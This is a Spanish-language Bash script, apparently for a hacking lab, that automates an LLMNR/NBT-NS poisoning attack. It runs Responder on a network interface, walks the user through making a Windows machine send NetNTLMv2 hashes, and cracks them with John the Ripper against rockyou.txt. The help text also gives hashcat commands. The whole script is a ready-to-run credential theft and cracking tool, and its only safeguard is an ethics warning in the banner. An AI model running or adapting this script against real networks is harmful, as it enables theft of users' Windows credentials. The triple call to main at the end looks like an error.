#!/bin/bash

# Script para automatizar el Lab 1.1: Active Online Attack con Responder y John the Ripper
# Diseñado para Kali Linux, paso a paso, con selección explícita de hashes

# Colores para una salida bonita
GREEN='\033[0;32m'
RED='\033[0;31m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
NC='\033[0m' # No hay color
CHECKMARK="✅"
ERROR="❌"
INFO="ℹ️"

# Variables de configuración
RESPONDER_DIR="/usr/share/responder"  # Ruta por defecto en Kali
RESPONDER_BINARY=$(which responder)   # Usar el binario responder de Kali
LOG_DIR="/usr/share/responder/logs"   # Directorio de logs
INTERFACE="eth0"                      # Cambia según tu entorno
JOHN_BINARY=$(which john)             # Detectar John automáticamente
WORDLIST="/usr/share/wordlists/rockyou.txt"  # Lista de palabras
MAX_WAIT=300                          # Tiempo máximo (segundos)
CHECK_INTERVAL=5                      # Intervalo de verificación (segundos)

# Función para mostrar el banner
print_banner() {
    clear
    echo -e "${BLUE}"
    cat << "EOF"
        ╔════════════════════════════════════════════╗
        ║                                            ║
        ║   Desarrollado por The-White-Hat 🎩        ║
        ║   ¡Suerte en tu aventura! 🚀              ║
        ║                                            ║
        ╚════════════════════════════════════════════╝
EOF
    echo -e "${NC}"
    echo -e "${YELLOW}¡Pana, bienvenido al script para el Lab 1.1: Active Online Attack!${NC}"
    echo -e "${RED}⚠️ Ojo: Esto es solo para laboratorios con permiso. ¡Sé ético, pana!${NC}"
    echo -e "${BLUE}========================================${NC}"
}

# Función para mostrar un separador
print_separator() {
    echo -e "${BLUE}========================================${NC}"
}

# Función para verificar dependencias
check_dependencies() {
    print_separator
    echo -e "${YELLOW}${INFO} Fase 1: Chequeando que tengamos todo lo necesario...${NC}"
    
    # Verificar git
    for cmd in git; do
        if ! command -v "$cmd" &> /dev/null; then
            echo -e "${RED}${ERROR} ¡Épale! No tienes $cmd instalado. Instálalo con: sudo apt install $cmd${NC}"
            exit 1
        fi
    done
    
    # Verificar John the Ripper
    if [ -z "$JOHN_BINARY" ]; then
        echo -e "${YELLOW}${INFO} John the Ripper no está instalado. Vamos a instalarlo...${NC}"
        sudo apt update
        sudo apt install -y john
        JOHN_BINARY=$(which john)
        if [ -z "$JOHN_BINARY" ]; then
            echo -e "${RED}${ERROR} ¡Épale! No se pudo instalar John. Hazlo manualmente con: sudo apt install john${NC}"
            exit 1
        fi
    fi
    
    # Verificar rockyou.txt
    if [ ! -f "$WORDLIST" ]; then
        if [ -f "/usr/share/wordlists/rockyou.txt.gz" ]; then
            echo -e "${YELLOW}${INFO} Descomprimiendo rockyou.txt...${NC}"
            sudo gunzip /usr/share/wordlists/rockyou.txt.gz
        else
            echo -e "${RED}${ERROR} ¡Épale! No encuentro la lista de palabras en $WORDLIST.${NC}"
            echo -e "${YELLOW}${INFO} Descarga una lista (ej. rockyou.txt) y actualiza la variable WORDLIST.${NC}"
            exit 1
        fi
    fi
    
    # Verificar Responder
    if [ -z "$RESPONDER_BINARY" ] || [ ! -d "$RESPONDER_DIR" ]; then
        echo -e "${YELLOW}${INFO} Responder no está instalado. Vamos a instalarlo...${NC}"
        sudo apt update
        sudo apt install -y responder
        RESPONDER_BINARY=$(which responder)
        
        # Si falla la instalación con apt, clonar desde GitHub
        if [ -z "$RESPONDER_BINARY" ]; then
            echo -e "${YELLOW}${INFO} Instalación con apt falló. Clonando desde GitHub...${NC}"
            sudo git clone https://github.com/SpiderLabs/Responder.git /opt/Responder
            RESPONDER_DIR="/opt/Responder"
            RESPONDER_BINARY="python3 /opt/Responder/Responder.py"
            LOG_DIR="/opt/Responder/logs"
            
            if [ ! -f "$RESPONDER_DIR/Responder.py" ]; then
                echo -e "${RED}${ERROR} ¡Épale! No se pudo instalar o clonar Responder. Chequea tu conexión o permisos.${NC}"
                exit 1
            fi
        fi
    fi
    
    echo -e "${GREEN}${CHECKMARK} ¡Listo, pana! Tenemos git, responder ($RESPONDER_BINARY), John ($JOHN_BINARY) y la lista de palabras.${NC}"
}

# Función para verificar la interfaz de red
check_interface() {
    print_separator
    echo -e "${YELLOW}${INFO} Fase 2: Chequeando tu conexión de red ($INTERFACE)...${NC}"
    
    if ! ip a show "$INTERFACE" &> /dev/null; then
        echo -e "${RED}${ERROR} ¡Épale! La interfaz $INTERFACE no existe. Usa 'ip a' para ver las interfaces disponibles.${NC}"
        echo -e "${YELLOW}${INFO} Interfaces disponibles:${NC}"
        ip a | grep -E "^[0-9]+:" | cut -d: -f2 | tr -d ' '
        exit 1
    fi
    
    echo -e "${GREEN}${CHECKMARK} ¡Chévere! La interfaz $INTERFACE está lista.${NC}"
}

# Función para mostrar instrucciones para la máquina Windows
guide_windows() {
    print_separator
    echo -e "${YELLOW}${INFO} Fase 3: ¡Pana, ahora toca la máquina Windows!${NC}"
    echo -e "${BLUE}Responder está corriendo y listo. Haz esto en tu máquina Windows:${NC}"
    echo -e "1. Abre el Explorador de Archivos (presiona Win + E). 🗂️"
    echo -e "2. En la barra de direcciones, escribe exactamente: \\\\test"
    echo -e "3. Presiona Enter. Esto conectará con un recurso falso que crea Responder."
    echo -e "4. Si te pide usuario y contraseña, mete cualquiera (¡nada de usar las reales, eh!)."
    echo -e "${YELLOW}${INFO} Esto hace que Windows mande un hash que vamos a capturar. ¡Tranquilo, es un laboratorio!${NC}"
    echo -e "${BLUE}Cuando termines en Windows, regresa aquí y presiona Enter para seguir...${NC}"
    read -r
    echo -e "${GREEN}${CHECKMARK} ¡Ok, pana! Vamos a ver qué capturamos...${NC}"
}

# Función para esperar a que Responder esté listo
wait_for_responder_ready() {
    echo -e "${YELLOW}${INFO} Esperando a que Responder esté completamente listo...${NC}"
    
    # Crear archivo temporal para capturar la salida de Responder
    RESPONDER_OUTPUT="/tmp/responder_output.txt"
    
    # Redirigir la salida de Responder al archivo temporal
    sudo tail -f /var/log/syslog | grep -i responder > "$RESPONDER_OUTPUT" &
    TAIL_PID=$!
    
    # Monitorear hasta que vea "Listening for events" o mensajes de envenenamiento
    local timeout=45
    local elapsed=0
    
    echo -e "${BLUE}Iniciando Responder... (esto puede tomar unos segundos)${NC}"
    
    while [ $elapsed -lt $timeout ]; do
        # Verificar que el proceso de Responder siga corriendo
        if ! ps -p $RESPONDER_PID > /dev/null 2>&1; then
            echo -e "${RED}${ERROR} ¡Épale! Responder se cerró inesperadamente.${NC}"
            kill $TAIL_PID 2>/dev/null
            return 1
        fi
        
        # Buscar indicadores de que Responder está funcionando
        # Después de 15 segundos, asumir que está listo (el puerto 80 no es crítico)
        if [ $elapsed -gt 15 ]; then
            echo -e "${GREEN}${CHECKMARK} ¡Responder debería estar listo ahora!${NC}"
            echo -e "${YELLOW}${INFO} (El error del puerto 80 es normal si hay otro servidor web corriendo)${NC}"
            kill $TAIL_PID 2>/dev/null
            rm -f "$RESPONDER_OUTPUT"
            return 0
        fi
        
        sleep 3
        elapsed=$((elapsed + 3))
        echo -e "${BLUE}Inicializando... ($elapsed/$timeout segundos)${NC}"
    done
    
    echo -e "${YELLOW}${INFO} Responder debería estar listo después de $timeout segundos.${NC}"
    kill $TAIL_PID 2>/dev/null
    rm -f "$RESPONDER_OUTPUT"
    return 0
}

# Función para ejecutar Responder y esperar hashes
run_responder() {
    print_separator
    echo -e "${YELLOW}${INFO} Fase 4: Iniciando Responder en $INTERFACE...${NC}"
    
    # Mostrar información previa
    echo -e "${BLUE}Nota: Es normal ver errores sobre puertos ocupados (como puerto 80).${NC}"
    echo -e "${BLUE}Responder seguirá funcionando con los otros servicios.${NC}"
    echo
    
    # Iniciar Responder en segundo plano y mostrar su salida por unos segundos
    echo -e "${YELLOW}${INFO} Ejecutando: sudo $RESPONDER_BINARY -I $INTERFACE${NC}"
    sudo $RESPONDER_BINARY -I "$INTERFACE" > /tmp/responder_full_output.txt 2>&1 &
    RESPONDER_PID=$!
    
    # Mostrar la salida de Responder en tiempo real por unos segundos
    echo -e "${GREEN}${CHECKMARK} Responder iniciando (PID: $RESPONDER_PID)...${NC}"
    echo -e "${BLUE}Mostrando salida de Responder:${NC}"
    echo -e "${BLUE}----------------------------------------${NC}"
    
    # Mostrar la salida en tiempo real por 5 segundos
    timeout 5 tail -f /tmp/responder_full_output.txt 2>/dev/null &
    TAIL_PID=$!
    
    # Esperar 5 segundos para que se muestre la salida inicial
    sleep 5
    
    # Matar el tail
    kill $TAIL_PID 2>/dev/null
    wait $TAIL_PID 2>/dev/null
    
    echo -e "${BLUE}----------------------------------------${NC}"
    
    # Contador visual mientras se inicializa Responder (3 segundos más)
    INIT_TIME=3
    echo -e "${YELLOW}${INFO} Finalizando inicialización de Responder...${NC}"
    
    for i in $(seq 1 $INIT_TIME); do
        remaining=$((INIT_TIME - i + 1))
        echo -e "${BLUE}⏳ Inicializando Responder... ${remaining} segundos restantes${NC}"
        sleep 1
    done
    
    echo -e "${GREEN}✅ ¡Responder inicializado completamente!${NC}"
    
    # Verificar que Responder siga corriendo
    if ps -p $RESPONDER_PID > /dev/null 2>&1; then
        echo -e "${GREEN}${CHECKMARK} ¡Responder está corriendo y listo para capturar hashes!${NC}"
        # Mostrar instrucciones para Windows
        guide_windows
    else
        echo -e "${RED}${ERROR} ¡Épale! Responder se cerró. Revisa los errores arriba.${NC}"
        return 1
    fi
    
    # Buscar hashes capturados
    print_separator
    echo -e "${YELLOW}${INFO} Monitoreando capturas en $LOG_DIR (máximo $MAX_WAIT segundos)...${NC}"
    ELAPSED=0
    
    while [ $ELAPSED -lt $MAX_WAIT ]; do
        if ls "$LOG_DIR"/SMB-NTLMv2-SSP-*.txt &> /dev/null; then
            echo -e "${GREEN}${CHECKMARK} ¡Capturamos al menos un hash en $LOG_DIR!${NC}"
            sudo kill "$RESPONDER_PID" 2>/dev/null
            wait "$RESPONDER_PID" 2>/dev/null
            echo -e "${GREEN}${CHECKMARK} Responder detenido.${NC}"
            return 0
        fi
        sleep "$CHECK_INTERVAL"
        ELAPSED=$((ELAPSED + CHECK_INTERVAL))
        
        # Contador visual para el monitoreo (líneas separadas para mayor claridad)
        remaining=$((MAX_WAIT - ELAPSED))
        echo -e "${BLUE}🔍 Monitoreando capturas... Transcurrido: ${ELAPSED}s | Restante: ${remaining}s | Total: ${MAX_WAIT}s${NC}"
    done
    
    echo -e "${RED}${ERROR} ¡Épale! No capturamos hashes en $MAX_WAIT segundos. Chequea la sección de ayuda al final.${NC}"
    sudo kill "$RESPONDER_PID" 2>/dev/null
    wait "$RESPONDER_PID" 2>/dev/null
    echo -e "${GREEN}${CHECKMARK} Responder detenido.${NC}"
    
    # Mostrar la salida completa para debugging
    echo -e "${YELLOW}${INFO} Salida completa de Responder para debugging:${NC}"
    cat /tmp/responder_full_output.txt
    rm -f /tmp/responder_full_output.txt
    
    return 1
}

# Función para seleccionar y crackear hashes
select_and_crack_hashes() {
    while true; do
        print_separator
        echo -e "${YELLOW}${INFO} Fase 5: Vamos a revisar qué hashes tenemos...${NC}"
        
        if [ ! -d "$LOG_DIR" ]; then
            echo -e "${RED}${ERROR} ¡Épale! No encuentro el directorio de logs $LOG_DIR.${NC}"
            exit 1
        fi
        
        cd "$LOG_DIR"
        HASH_FILES=($(ls SMB-NTLMv2-SSP-*.txt 2>/dev/null))
        
        if [ ${#HASH_FILES[@]} -eq 0 ]; then
            echo -e "${RED}${ERROR} ¡Épale! No encontramos hashes. ¿Seguro que escribiste \\\\test en Windows?${NC}"
            echo -e "${YELLOW}${INFO} ¿Quieres intentar capturar otro hash? (Escribe 'retry' para volver a intentar, cualquier otra tecla para salir)${NC}"
            read -r CHOICE
            if [ "$CHOICE" = "retry" ]; then
                run_responder
                continue
            else
                exit 1
            fi
        fi
        
        echo -e "${GREEN}${CHECKMARK} ¡Ok, pana! Tengo ${#HASH_FILES[@]} hash(es):${NC}"
        for i in "${!HASH_FILES[@]}"; do
            echo -e "${BLUE}[$((i+1))] ${HASH_FILES[$i]}${NC}"
        done
        
        # Lógica de selección
        if [ ${#HASH_FILES[@]} -eq 1 ]; then
            echo -e "${YELLOW}${INFO} Solo hay un hash. ¿Quieres romper este hash ([1]) o prefieres intentar capturar otro? (Escribe '1' para romperlo, 'retry' para volver a intentar)${NC}"
            read -p "Opción: " CHOICE
            
            if [ "$CHOICE" = "retry" ]; then
                run_responder
                continue
            elif [ "$CHOICE" = "1" ]; then
                SELECTED_FILES=("${HASH_FILES[0]}")
            else
                echo -e "${RED}${ERROR} ¡Épale! Opción inválida. Selecciona '1' o 'retry'.${NC}"
                continue
            fi
        else
            echo -e "${YELLOW}${INFO} Selecciona cuál hash quieres romper (1-${#HASH_FILES[@]}) o escribe 'all' para todos, o 'retry' para capturar otro:${NC}"
            read -p "Opción: " CHOICE
            
            if [ "$CHOICE" = "retry" ]; then
                run_responder
                continue
            elif [ "$CHOICE" = "all" ]; then
                SELECTED_FILES=("${HASH_FILES[@]}")
            else
                if [[ ! "$CHOICE" =~ ^[0-9]+$ ]] || [ "$CHOICE" -lt 1 ] || [ "$CHOICE" -gt "${#HASH_FILES[@]}" ]; then
                    echo -e "${RED}${ERROR} ¡Épale! Opción no válida. Usa un número entre 1 y ${#HASH_FILES[@]}, 'all' o 'retry'.${NC}"
                    continue
                fi
                SELECTED_FILES=("${HASH_FILES[$((CHOICE-1))]}")
            fi
        fi
        
        # Crackear los hashes seleccionados
        print_separator
        echo -e "${YELLOW}${INFO} Fase 6: Rompiendo los hashes seleccionados...${NC}"
        
        for HASH_FILE in "${SELECTED_FILES[@]}"; do
            echo -e "${YELLOW}${INFO} Intentando romper $HASH_FILE con John the Ripper...${NC}"
            echo
            sudo "$JOHN_BINARY" --format=netntlmv2 --wordlist="$WORDLIST" "$HASH_FILE"
            
            if [ $? -eq 0 ]; then
                echo -e "${GREEN}${CHECKMARK} ¡Listo, pana! Resultados para $HASH_FILE:${NC}"
                sudo "$JOHN_BINARY" --show --format=netntlmv2 "$HASH_FILE"
            else
                echo -e "${RED}${ERROR} ¡Épale! No se pudo romper $HASH_FILE. Mira la sección de ayuda al final.${NC}"
            fi
            echo
        done
        
        break
    done
}

# Función para mostrar ayuda con errores comunes
print_help() {
    print_separator
    echo -e "${YELLOW}${INFO} Ayuda: Si algo salió mal, aquí tienes unas soluciones${NC}"
    echo -e "${BLUE}Si no se capturan hashes:${NC}"
    echo -e "  - Asegúrate de que la máquina Windows esté en la misma red (prueba: ping <IP Windows> desde Kali)."
    echo -e "  - Escribe exactamente \\\\test (dos barras invertidas)."
    echo -e "  - Verifica que LLMNR/NBT-NS estén habilitados en Windows (usualmente lo están en Windows 10)."
    echo -e "  - Chequea la interfaz con: ip a"
    echo -e "${BLUE}Si John no rompe el hash:${NC}"
    echo -e "  - Prueba con reglas adicionales:"
    echo -e "    sudo john --format=netntlmv2 --wordlist=$WORDLIST --rules $LOG_DIR/SMB-NTLMv2-SSP-*.txt"
    echo -e "  - O usa Hashcat para más velocidad:"
    echo -e "    hashcat -m 5600 $LOG_DIR/SMB-NTLMv2-SSP-*.txt $WORDLIST"
    echo -e "${BLUE}Si hay errores de instalación:${NC}"
    echo -e "  - Si falla apt install responder, chequea tu conexión o clona manualmente:"
    echo -e "    sudo git clone https://github.com/SpiderLabs/Responder.git /opt/Responder"
}

# Función principal
main() {
    # Verificar que se ejecuta como root para algunos comandos
    if [ "$EUID" -ne 0 ]; then
        echo -e "${RED}${ERROR} ¡Épale! Este script necesita permisos de sudo. Ejecuta con: sudo $0${NC}"
        exit 1
    fi
    
    print_banner
    check_dependencies
    check_interface
    
    if run_responder; then
        select_and_crack_hashes
        
        print_separator
        echo -e "${GREEN}${CHECKMARK} ¡Lab 1.1 terminado! Mira los resultados arriba. 🎉${NC}"
        echo -e "${YELLOW}${INFO} Si hay resultados, ¡chévere! Si no hay, chequea la ayuda al final.${NC}"
        echo -e "${BLUE}Desarrollado por The-White-Hat, ¡síguete! 🎩${NC}"
    fi
    
    print_help
}

# Ejecutar el script
main "$@"
main "$@"
main "$@"
